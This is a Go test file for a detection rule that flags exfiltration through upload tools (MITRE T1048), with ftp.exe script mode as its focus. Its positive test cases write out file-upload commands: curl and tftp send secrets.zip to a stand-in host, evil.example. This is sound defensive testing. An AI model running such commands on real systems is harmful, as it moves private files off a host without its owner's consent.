package detection

import "testing"

// The T1048 upload-tools rule covered curl, wget, tftp and Invoke-WebRequest but
// not the built-in ftp.exe — the one transfer client present on every Windows
// host, which needs no download and no installation.
//
// ftp.exe is awkward to detect: put/get are typed inside the interactive session,
// never passed as arguments, so process creation cannot reveal the direction.
// Matching bare ftp.exe would therefore alert on every launch, including an idle
// or read-only session — a rule that fires on the mere presence of a tool. The
// selection keys on -s: (unattended script mode) instead: interactive use never
// carries it, the scripted invocation used for exfil does.
func TestT1048UploadTools_FTPScriptMode(t *testing.T) {
	ev := NewSigmaEvaluator()
	LoadBuiltinRules(ev)

	const title = "Data Exfiltration Over Alternative Protocol (Upload Tools)"
	fires := func(image, cmdline string) bool {
		event := map[string]interface{}{
			"type":         "process",
			"image_path":   image,
			"command_line": cmdline,
		}
		addPipelineSigmaAliases(event)
		for _, m := range ev.EvaluateEvent(event) {
			if m.RuleTitle == title {
				return true
			}
		}
		return false
	}

	// ── Must NOT fire: interactive ftp reveals nothing about direction ──
	benign := []struct{ name, image, cmdline string }{
		{"bare interactive ftp.exe launch", `C:\Windows\System32\ftp.exe`, `ftp.exe`},
		{"interactive ftp.exe with a target host", `C:\Windows\System32\ftp.exe`, `ftp.exe ftp.example.com`},
		{"curl plain download", `C:\Windows\System32\curl.exe`, `curl.exe -o out.zip https://example.com/file.zip`},
	}
	for _, b := range benign {
		if fires(b.image, b.cmdline) {
			t.Errorf("FALSE POSITIVE: %s fired the T1048 upload rule", b.name)
		}
	}

	// ── Must fire ──
	truePos := []struct{ name, image, cmdline string }{
		{"ftp.exe unattended script mode", `C:\Windows\System32\ftp.exe`, `ftp.exe -s:C:\Users\Public\upload_script.txt`},
		{"curl -T upload", `C:\Windows\System32\curl.exe`, `curl.exe -T C:\Users\Public\secrets.zip https://evil.example/up`},
		{"curl --upload-file", `C:\Windows\System32\curl.exe`, `curl.exe --upload-file C:\Users\Public\secrets.zip https://evil.example/up`},
		{"tftp put", `C:\Windows\System32\tftp.exe`, `tftp.exe -i 10.0.0.1 put secrets.zip`},
	}
	for _, p := range truePos {
		if !fires(p.image, p.cmdline) {
			t.Errorf("MISSED true positive: %s did not fire the T1048 upload rule", p.name)
		}
	}
}

// tftp.exe must keep matching through the tftp selection and must NOT be swept
// into the ftp_script selection — the reason that one uses endswith with the
// leading path separator rather than a bare contains.
func TestT1048UploadTools_TFTPNotCaughtByFTPSelection(t *testing.T) {
	ev := NewSigmaEvaluator()
	LoadBuiltinRules(ev)

	const title = "Data Exfiltration Over Alternative Protocol (Upload Tools)"
	// tftp with -s: but no put: if ftp_script matched tftp.exe, this would fire.
	event := map[string]interface{}{
		"type":         "process",
		"image_path":   `C:\Windows\System32\tftp.exe`,
		"command_line": `tftp.exe -s:something`,
	}
	addPipelineSigmaAliases(event)
	for _, m := range ev.EvaluateEvent(event) {
		if m.RuleTitle == title {
			t.Fatalf("tftp.exe was matched by the ftp.exe selection; Image|endswith must require the path separator")
		}
	}
}
